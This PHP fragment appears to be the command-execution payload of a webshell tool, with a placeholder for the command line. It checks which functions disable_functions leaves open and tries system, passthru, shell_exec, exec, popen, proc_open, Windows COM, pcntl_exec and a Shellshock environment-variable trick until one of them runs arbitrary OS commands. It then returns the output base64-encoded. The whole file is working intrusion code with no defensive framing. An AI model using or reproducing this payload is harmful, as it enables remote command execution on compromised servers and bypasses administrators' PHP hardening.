function function_existsEx($functionName){
    $d=explode(",",@ini_get("disable_functions"));
    if(empty($d)){
        $d=array();
    }else{
        $d=array_map('trim',array_map('strtolower',$d));
    }
    return(function_exists($functionName)&&is_callable($functionName)&&!in_array($functionName,$d));
}
function execCommand(){
    @ob_start();
    $cmdLine="{{cmdLine}}";
    if(substr(__FILE__,0,1)=="/"){
        @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    }else{
        @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    $result="";
    if (!function_existsEx("runshellshock")){
        function runshellshock($d, $c) {
            if (substr($d, 0, 1) == "/" && function_existsEx('putenv') && (function_existsEx('error_log') || function_existsEx('mail'))) {
                if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                    $tmp = tempnam(sys_get_temp_dir(), 'as');
                    putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                    if (function_existsEx('error_log')) {
                        error_log("a", 1);
                    } else {
                        mail("a@127.0.0.1", "", "", "-bv");
                    }
                } else {
                    return False;
                }
                $output = @file_get_contents($tmp);
                @unlink($tmp);
                if ($output != "") {
                    return $output;
                }
            }
            return False;
        };
    }

    if(function_existsEx('system')){
        @system($cmdLine,$ret);
    }elseif(function_existsEx('passthru')){
        $result=@passthru($cmdLine,$ret);
    }elseif(function_existsEx('shell_exec')){
        $result=@shell_exec($cmdLine);
    }elseif(function_existsEx('exec')){
        @exec($cmdLine,$o,$ret);
        $result=join("\n",$o);
    }elseif(function_existsEx('popen')){
        $fp=@popen($cmdLine,'r');
        while(!@feof($fp)){
            $result.=@fgets($fp,1024*1024);
        }
        @pclose($fp);
    }elseif(function_existsEx('proc_open')){
        $p = @proc_open($cmdLine, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while(!@feof($io[1])){
            $result.=@fgets($io[1],1024*1024);
        }
        while(!@feof($io[2])){
            $result.=@fgets($io[2],1024*1024);
        }
        @fclose($io[1]);
        @fclose($io[2]);
        @proc_close($p);
    }elseif(substr(__FILE__,0,1)!="/" && @class_exists("COM")){
        $w=new COM('WScript.shell');
        $e=$w->exec($cmdLine);
        $so=$e->StdOut();
        $result.=$so->ReadAll();
        $se=$e->StdErr();
        $result.=$se->ReadAll();
    }elseif (function_existsEx("pcntl_fork")&&function_existsEx("pcntl_exec")){
        $cmd="/bin/bash";
        if (!file_exists($cmd)){
            $cmd="/bin/sh";
        }
        $commandFile=sys_get_temp_dir()."/".time().".log";
        $resultFile=sys_get_temp_dir()."/".(time()+1).".log";
        @file_put_contents($commandFile,$cmdLine);
        switch (pcntl_fork()) {
            case 0:
                $args = array("-c", "$cmdLine > $resultFile");
                pcntl_exec($cmd, $args);
                // the child will only reach this point on exec failure,
                // because execution shifts to the pcntl_exec()ed command
                exit(0);
            default:
                break;
        }
        if (!file_exists($resultFile)){
            sleep(2);
        }
        $result=file_get_contents($resultFile);
        @unlink($commandFile);
        @unlink($resultFile);

    }elseif(($result=runshellshock(__FILE__, $cmdLine)!==false)) {

    }else{
        return "Command execution function is disabled Tried proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec";
    }
    $result .= @ob_get_contents();
    @ob_end_clean();

    return $result;
}
$result = base64_encode(execCommand());
return $result;